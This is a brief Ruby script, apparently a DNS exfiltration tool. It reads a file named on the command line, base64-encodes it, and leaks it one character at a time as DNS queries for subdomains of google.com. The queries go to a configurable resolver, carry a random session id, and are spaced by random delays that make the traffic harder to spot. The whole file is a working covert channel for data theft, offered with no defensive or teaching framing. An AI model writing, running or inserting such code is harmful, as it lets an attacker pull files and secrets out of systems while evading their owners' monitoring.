require 'resolv'
require 'base64'

file_name = ARGV[0]
file = File.read(file_name)
encoded_file = Base64.encode64(file).chomp!

def send_me(host)
  resolver = Resolv::DNS.new(:nameserver => ["127.0.0.1"])

  fqdn = host + ".google.com"

  begin
    Timeout::timeout(10) {
      name = resolver.getaddress(fqdn)
      puts fqdn
    }
  rescue Resolv::ResolvError, Timeout::Error
    #nop
  end
end

send_me("s")
session_id = rand(10000)
encoded_file.chars.each do |char|
  sleep(rand(10))
  send_me(session_id.to_s + "ads" + char.ord.to_s)
end
send_me("e")
